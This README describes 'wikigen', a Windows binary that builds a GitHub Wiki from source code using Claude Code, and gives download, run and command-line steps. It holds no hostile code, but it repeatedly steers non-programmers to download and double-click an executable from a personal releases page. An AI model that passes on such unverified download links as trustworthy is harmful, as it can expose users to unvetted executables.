# 🧩 wikigen - Generate Wiki Easily from Code

[![Download wikigen](https://img.shields.io/badge/Download-wikigen-brightgreen)](https://github.com/lucioflavi3308/wikigen/releases)

---

## 📋 About wikigen

wikigen is a tool that builds a GitHub Wiki from your source code using Claude Code. It is a single Go binary, so you do not need Docker or extra software to run it. This makes setup simpler for users who want to create documentation quickly.

You do not need any programming experience. Just download and run the program, and it will do the rest.

---

## 🚀 Getting Started: Download wikigen

To use wikigen on Windows, follow these steps:

1. Visit the release page by clicking the button below:  

   [![Download wikigen](https://img.shields.io/badge/Download-wikigen-blue)](https://github.com/lucioflavi3308/wikigen/releases)

2. On the release page, find the latest version for Windows. It will have a file name like `wikigen_windows_amd64.exe`.

3. Click the file name to download it. Save it somewhere easy to find, like the Desktop or Downloads folder.

---

## 💾 Installing and Running wikigen on Windows

There is no traditional installation needed. The binary you downloaded is the program.

1. Open File Explorer and go to the folder where you saved the downloaded `.exe` file.

2. Double-click `wikigen_windows_amd64.exe` to run it.

3. The program will open a command prompt window. Here you can start generating your GitHub Wiki.

---

## ⚙️ How wikigen Works

wikigen reads your source code and uses Claude Code to generate clear documentation for your project. It organizes that documentation into a GitHub Wiki format.

You run it from the command prompt with simple commands. For example:

- Point wikigen to your source code folder
- It processes the code to create Wiki pages automatically
- You get ready-to-publish wiki files you can upload to your GitHub repository

---

## 💡 Using wikigen Step-by-Step

1. Place your source code in a folder on your Windows PC.

2. Open Command Prompt:
   - Press Win + R, type `cmd`, and press Enter.

3. Use the `cd` command to go to the folder where `wikigen_windows_amd64.exe` lives. For example:

   ```
   cd C:\Users\YourName\Downloads
   ```

4. Run wikigen with the folder that contains your source code. Replace `C:\Path\To\Source` with your folder path:

   ```
   wikigen_windows_amd64.exe -source "C:\Path\To\Source"
   ```

5. wikigen will generate the wiki files in a folder. The output folder name appears in the command prompt.

---

## 📂 Output and Uploading Wiki

After running wikigen, check the output folder (usually named `wiki` or similar).

- The folder contains Markdown files for GitHub Wiki.
- If your GitHub repository uses Wiki, you can upload these markdown files to your repository’s Wiki.

To upload the wiki files:

1. Go to your GitHub repository in a browser.

2. Click the "Wiki" tab.

3. Use the GitHub Wiki editor or clone the wiki repository to upload the markdown files.

---

## 🛠 System Requirements

wikigen runs on Windows 10 or later versions. It needs:

- At least 2 GB of free RAM
- About 50 MB of free storage space
- An internet connection for Claude Code API usage

Make sure your Windows user account has permission to run downloaded programs.

---

## 🔧 Common Commands

- Show help:

  ```
  wikigen_windows_amd64.exe -help
  ```

- Set source folder path:

  ```
  wikigen_windows_amd64.exe -source "C:\MyProject\Src"
  ```

- Set output folder path (optional):

  ```
  wikigen_windows_amd64.exe -source "C:\MyProject\Src" -output "C:\MyProject\Wiki"
  ```

---

## 🧰 Features at a Glance

- Single executable file, no extra software needed
- Converts source code to organized GitHub Wiki documentation
- Works on Windows without installation
- Uses Claude Code for natural language processing
- Simple command-line interface for easy use
- Supports multiple programming languages

---

## 💬 Need Help?

If you run into issues:

- Check the command prompt messages for errors
- Make sure the source code path is correct
- Verify that the program has permission to run
- Visit the [release page](https://github.com/lucioflavi3308/wikigen/releases) for updates or new versions

---

## 📥 Download wikigen Here

Use this link anytime to get the latest version:

[![Download wikigen](https://img.shields.io/badge/Download-latest-green)](https://github.com/lucioflavi3308/wikigen/releases)